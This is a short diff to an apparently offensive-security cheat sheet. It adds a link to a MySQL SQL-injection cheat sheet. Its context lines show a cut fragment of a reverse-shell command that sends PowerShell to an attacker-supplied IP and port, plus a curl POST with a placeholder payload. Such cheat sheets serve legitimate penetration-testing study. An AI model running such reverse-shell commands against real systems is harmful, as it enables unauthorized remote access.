@@ -726,6 +726,10 @@ your_ip -p lport -e powershell
 curl -X POST -d 'your_payload'
 ```
 ### SQL Injections
+
+Useful site:
+https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
+
 #### Some basic commands
 Remote SQL access:
 ```
